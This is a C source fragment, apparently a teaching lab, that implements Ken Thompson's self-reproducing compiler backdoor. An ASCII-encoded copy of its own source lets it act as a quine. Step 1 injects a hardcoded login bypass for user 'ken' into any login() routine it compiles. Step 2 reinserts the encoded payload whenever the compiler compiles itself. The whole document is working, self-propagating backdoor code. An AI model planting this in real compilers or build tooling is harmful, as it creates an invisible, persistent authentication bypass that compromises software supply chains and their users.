char prog[] = {
	47, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	10, 	32, 	32, 	32, 	32, 	42,
	32, 	83, 	116, 	101, 	112, 	32, 	49, 	58,
	10, 	32, 	32, 	32, 	32, 	42, 	47, 	10,
	10, 	47, 	47, 	32, 	109, 	97, 	116, 	99,
	104, 	32, 	111, 	110, 	32, 	116, 	104, 	101,
	32, 	115, 	116, 	97, 	114, 	116, 	32, 	111,
	102, 	32, 	116, 	104, 	101, 	32, 	108, 	111,
	103, 	105, 	110, 	40, 	41, 	32, 	114, 	111,
	117, 	116, 	105, 	110, 	101, 	58, 	10, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	108, 	111, 	103, 	105, 	110,
	95, 	115, 	105, 	103, 	91, 	93, 	32, 	61,
	32, 	34, 	105, 	110, 	116, 	32, 	108, 	111,
	103, 	105, 	110, 	40, 	99, 	104, 	97, 	114,
	32, 	42, 	117, 	115, 	101, 	114, 	41, 	32,
	123, 	34, 	59, 	10, 	10, 	47, 	47, 	32,
	97, 	110, 	100, 	32, 	105, 	110, 	106, 	101,
	99, 	116, 	32, 	97, 	110, 	32, 	97, 	116,
	116, 	97, 	99, 	107, 	32, 	102, 	111, 	114,
	32, 	34, 	107, 	101, 	110, 	34, 	58, 	10,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	102,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	117, 	115, 	101, 	114, 	44, 	32, 	92, 	34,
	107, 	101, 	110, 	92, 	34, 	41, 	32, 	61,
	61, 	32, 	48, 	41, 	32, 	114, 	101, 	116,
	117, 	114, 	110, 	32, 	49, 	59, 	34, 	59,
	10, 	10, 	115, 	116, 	97, 	116, 	105, 	99,
	32, 	99, 	104, 	97, 	114, 	32, 	101, 	110,
	116, 	101, 	114, 	91, 	93, 	32, 	61, 	32,
	34, 	92, 	110, 	34, 	59, 	10, 	10, 	99,
	104, 	97, 	114, 	32, 	42, 	112, 	116, 	114,
	32, 	61, 	32, 	115, 	116, 	114, 	115, 	116,
	114, 	40, 	112, 	114, 	111, 	103, 	114, 	97,
	109, 	44, 	32, 	108, 	111, 	103, 	105, 	110,
	95, 	115, 	105, 	103, 	41, 	59, 	10, 	105,
	102, 	32, 	40, 	112, 	116, 	114, 	32, 	33,
	61, 	32, 	78, 	85, 	76, 	76, 	41, 	32,
	123, 	10, 	32, 	32, 	32, 	32, 	99, 	104,
	97, 	114, 	32, 	42, 	105, 	110, 	115, 	101,
	114, 	116, 	95, 	112, 	116, 	114, 	32, 	61,
	32, 	115, 	116, 	114, 	99, 	104, 	114, 	40,
	112, 	116, 	114, 	44, 	32, 	39, 	92, 	110,
	39, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	99, 	104, 	97, 	114, 	32, 	116, 	109, 	112,
	32, 	61, 	32, 	42, 	105, 	110, 	115, 	101,
	114, 	116, 	95, 	112, 	116, 	114, 	59, 	10,
	32, 	32, 	32, 	32, 	42, 	105, 	110, 	115,
	101, 	114, 	116, 	95, 	112, 	116, 	114, 	32,
	61, 	32, 	39, 	92, 	48, 	39, 	59, 	10,
	32, 	32, 	32, 	32, 	102, 	112, 	114, 	105,
	110, 	116, 	102, 	40, 	102, 	112, 	44, 	32,
	34, 	37, 	115, 	34, 	44, 	32, 	112, 	114,
	111, 	103, 	114, 	97, 	109, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	42, 	112, 	114, 	111,
	103, 	114, 	97, 	109, 	32, 	61, 	32, 	39,
	92, 	48, 	39, 	59, 	10, 	32, 	32, 	32,
	32, 	102, 	112, 	114, 	105, 	110, 	116, 	102,
	40, 	102, 	112, 	44, 	32, 	34, 	37, 	115,
	34, 	44, 	32, 	101, 	110, 	116, 	101, 	114,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	102,
	112, 	44, 	32, 	34, 	37, 	115, 	34, 	44,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	97,
	116, 	116, 	97, 	99, 	107, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	102, 	112, 	114, 	105,
	110, 	116, 	102, 	40, 	102, 	112, 	44, 	32,
	34, 	37, 	115, 	34, 	44, 	32, 	101, 	110,
	116, 	101, 	114, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	102, 	112, 	44, 	32, 	34, 	37,
	115, 	34, 	44, 	32, 	105, 	110, 	115, 	101,
	114, 	116, 	95, 	112, 	116, 	114, 	43, 	49,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	42,
	105, 	110, 	115, 	101, 	114, 	116, 	95, 	112,
	116, 	114, 	32, 	61, 	32, 	116, 	109, 	112,
	59, 	10, 	125, 	10, 	10, 	47, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	10,
	32, 	32, 	32, 	32, 	42, 	32, 	83, 	116,
	101, 	112, 	32, 	50, 	58, 	10, 	32, 	32,
	32, 	32, 	42, 	47, 	10, 	10, 	47, 	47,
	32, 	115, 	101, 	97, 	114, 	99, 	104, 	32,
	102, 	111, 	114, 	32, 	116, 	104, 	101, 	32,
	115, 	116, 	97, 	114, 	116, 	32, 	111, 	102,
	32, 	116, 	104, 	101, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	32, 	114, 	111, 	117,
	116, 	105, 	110, 	101, 	58, 	32, 	10, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	99, 	111, 	109, 	112, 	105,
	108, 	101, 	95, 	115, 	105, 	103, 	91, 	93,
	32, 	61, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	34, 	115, 	116, 	97, 	116,
	105, 	99, 	32, 	118, 	111, 	105, 	100, 	32,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	40,
	99, 	104, 	97, 	114, 	32, 	42, 	112, 	114,
	111, 	103, 	114, 	97, 	109, 	44, 	32, 	99,
	104, 	97, 	114, 	32, 	42, 	111, 	117, 	116,
	110, 	97, 	109, 	101, 	41, 	32, 	123, 	92,
	110, 	34, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	34, 	32, 	32, 	32, 	32,
	70, 	73, 	76, 	69, 	32, 	42, 	102, 	112,
	32, 	61, 	32, 	102, 	111, 	112, 	101, 	110,
	40, 	92, 	34, 	46, 	47, 	116, 	101, 	109,
	112, 	45, 	111, 	117, 	116, 	46, 	99, 	92,
	34, 	44, 	32, 	92, 	34, 	119, 	92, 	34,
	41, 	59, 	92, 	110, 	34, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	34, 	32,
	32, 	32, 	32, 	97, 	115, 	115, 	101, 	114,
	116, 	40, 	102, 	112, 	41, 	59, 	34, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	59, 	10, 	10, 	47, 	47, 	32, 	97, 	110,
	100, 	32, 	105, 	110, 	106, 	101, 	99, 	116,
	32, 	97, 	32, 	112, 	108, 	97, 	99, 	101,
	104, 	111, 	108, 	100, 	101, 	114, 	32, 	34,
	97, 	116, 	116, 	97, 	99, 	107, 	34, 	58,
	10, 	47, 	47, 	32, 	105, 	110, 	106, 	101,
	99, 	116, 	32, 	116, 	104, 	105, 	115, 	32,
	97, 	102, 	116, 	101, 	114, 	32, 	116, 	104,
	101, 	32, 	97, 	115, 	115, 	101, 	114, 	116,
	32, 	97, 	98, 	111, 	118, 	101, 	32, 	97,
	102, 	116, 	101, 	114, 	32, 	116, 	104, 	101,
	32, 	99, 	97, 	108, 	108, 	32, 	116, 	111,
	32, 	102, 	111, 	112, 	101, 	110, 	46, 	10,
	47, 	47, 	32, 	110, 	111, 	116, 	32, 	109,
	117, 	99, 	104, 	32, 	111, 	102, 	32, 	97,
	110, 	32, 	97, 	116, 	116, 	97, 	99, 	107,
	46, 	32, 	32, 	32, 	116, 	104, 	105, 	115,
	32, 	105, 	115, 	32, 	106, 	117, 	115, 	116,
	32, 	97, 	32, 	113, 	117, 	105, 	99, 	107,
	32, 	112, 	108, 	97, 	99, 	101, 	104, 	111,
	108, 	100, 	101, 	114, 	46, 	10, 	47, 	47,
	32, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	95, 	97, 	116, 	116,
	97, 	99, 	107, 	91, 	93, 	32, 	10, 	47,
	47, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	61, 	32,
	34, 	112, 	114, 	105, 	110, 	116, 	102, 	40,
	92, 	34, 	37, 	115, 	58, 	32, 	35, 	105,
	110, 	99, 	108, 	117, 	100, 	101, 	32, 	92,
	39, 	97, 	116, 	116, 	97, 	99, 	107, 	45,
	115, 	101, 	101, 	100, 	46, 	99, 	92, 	39,
	92, 	92, 	110, 	92, 	34, 	44, 	32, 	95,
	95, 	70, 	85, 	78, 	67, 	84, 	73, 	79,
	78, 	95, 	95, 	41, 	59, 	34, 	59, 	10,
	10, 	112, 	116, 	114, 	32, 	61, 	32, 	115,
	116, 	114, 	115, 	116, 	114, 	40, 	112, 	114,
	111, 	103, 	114, 	97, 	109, 	44, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	95, 	115,
	105, 	103, 	41, 	59, 	10, 	105, 	102, 	32,
	40, 	112, 	116, 	114, 	32, 	33, 	61, 	32,
	78, 	85, 	76, 	76, 	41, 	32, 	123, 	10,
	32, 	32, 	32, 	32, 	115, 	116, 	97, 	116,
	105, 	99, 	32, 	99, 	104, 	97, 	114, 	32,
	97, 	115, 	115, 	101, 	114, 	116, 	95, 	115,
	116, 	114, 	91, 	93, 	32, 	61, 	32, 	34,
	97, 	115, 	115, 	101, 	114, 	116, 	34, 	59,
	10, 	32, 	32, 	32, 	32, 	99, 	104, 	97,
	114, 	32, 	42, 	105, 	110, 	115, 	101, 	114,
	116, 	95, 	112, 	116, 	114, 	32, 	61, 	32,
	115, 	116, 	114, 	115, 	116, 	114, 	40, 	112,
	116, 	114, 	44, 	32, 	97, 	115, 	115, 	101,
	114, 	116, 	95, 	115, 	116, 	114, 	41, 	59,
	10, 	32, 	32, 	32, 	32, 	105, 	110, 	115,
	101, 	114, 	116, 	95, 	112, 	116, 	114, 	32,
	61, 	32, 	115, 	116, 	114, 	99, 	104, 	114,
	40, 	105, 	110, 	115, 	101, 	114, 	116, 	95,
	112, 	116, 	114, 	44, 	32, 	39, 	92, 	110,
	39, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	42, 	105, 	110, 	115, 	101, 	114, 	116, 	95,
	112, 	116, 	114, 	32, 	61, 	32, 	39, 	92,
	48, 	39, 	59, 	10, 	32, 	32, 	32, 	32,
	102, 	112, 	114, 	105, 	110, 	116, 	102, 	40,
	102, 	112, 	44, 	32, 	34, 	37, 	115, 	34,
	44, 	32, 	112, 	114, 	111, 	103, 	114, 	97,
	109, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	42, 	112, 	114, 	111, 	103, 	114, 	97, 	109,
	32, 	61, 	32, 	39, 	92, 	48, 	39, 	59,
	10, 	32, 	32, 	32, 	32, 	102, 	112, 	114,
	105, 	110, 	116, 	102, 	40, 	102, 	112, 	44,
	32, 	34, 	99, 	104, 	97, 	114, 	32, 	112,
	114, 	111, 	103, 	91, 	93, 	32, 	61, 	32,
	123, 	92, 	110, 	34, 	41, 	59, 	10, 	32,
	32, 	32, 	32, 	105, 	110, 	116, 	32, 	105,
	59, 	10, 	32, 	32, 	32, 	32, 	102, 	111,
	114, 	40, 	105, 	32, 	61, 	32, 	48, 	59,
	32, 	112, 	114, 	111, 	103, 	91, 	105, 	93,
	59, 	32, 	105, 	43, 	43, 	41, 	10, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	102,
	112, 	44, 	32, 	34, 	92, 	116, 	37, 	100,
	44, 	37, 	99, 	34, 	44, 	32, 	112, 	114,
	111, 	103, 	91, 	105, 	93, 	44, 	32, 	40,
	105, 	43, 	49, 	41, 	37, 	56, 	61, 	61,
	48, 	32, 	63, 	32, 	39, 	92, 	110, 	39,
	32, 	58, 	32, 	39, 	32, 	39, 	41, 	59,
	10, 	32, 	32, 	32, 	32, 	102, 	112, 	114,
	105, 	110, 	116, 	102, 	40, 	102, 	112, 	44,
	32, 	34, 	48, 	32, 	125, 	59, 	92, 	110,
	34, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	102, 	112, 	114, 	105, 	110, 	116, 	102, 	40,
	102, 	112, 	44, 	32, 	34, 	37, 	115, 	34,
	44, 	32, 	112, 	114, 	111, 	103, 	41, 	59,
	10, 	32, 	32, 	32, 	32, 	102, 	112, 	114,
	105, 	110, 	116, 	102, 	40, 	102, 	112, 	44,
	32, 	34, 	37, 	115, 	34, 	44, 	32, 	105,
	110, 	115, 	101, 	114, 	116, 	95, 	112, 	116,
	114, 	43, 	49, 	41, 	59, 	10, 	125, 	10,
0 };
/*****************************************************************
    * Step 1:
    */

// match on the start of the login() routine:
static char login_sig[] = "int login(char *user) {";

// and inject an attack for "ken":
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

static char enter[] = "\n";

char *ptr = strstr(program, login_sig);
if (ptr != NULL) {
    char *insert_ptr = strchr(ptr, '\n');
    char tmp = *insert_ptr;
    *insert_ptr = '\0';
    fprintf(fp, "%s", program);
    *program = '\0';
    fprintf(fp, "%s", enter);
    fprintf(fp, "%s", login_attack);
    fprintf(fp, "%s", enter);
    fprintf(fp, "%s", insert_ptr+1);
    *insert_ptr = tmp;
}

/*****************************************************************
    * Step 2:
    */

// search for the start of the compile routine: 
static char compile_sig[] =
        "static void compile(char *program, char *outname) {\n"
        "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
        "    assert(fp);"
        ;

// and inject a placeholder "attack":
// inject this after the assert above after the call to fopen.
// not much of an attack.   this is just a quick placeholder.
// static char compile_attack[] 
//             = "printf(\"%s: #include \'attack-seed.c\'\\n\", __FUNCTION__);";

ptr = strstr(program, compile_sig);
if (ptr != NULL) {
    static char assert_str[] = "assert";
    char *insert_ptr = strstr(ptr, assert_str);
    insert_ptr = strchr(insert_ptr, '\n');
    *insert_ptr = '\0';
    fprintf(fp, "%s", program);
    *program = '\0';
    fprintf(fp, "char prog[] = {\n");
    int i;
    for(i = 0; prog[i]; i++)
        fprintf(fp, "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
    fprintf(fp, "0 };\n");
    fprintf(fp, "%s", prog);
    fprintf(fp, "%s", insert_ptr+1);
}
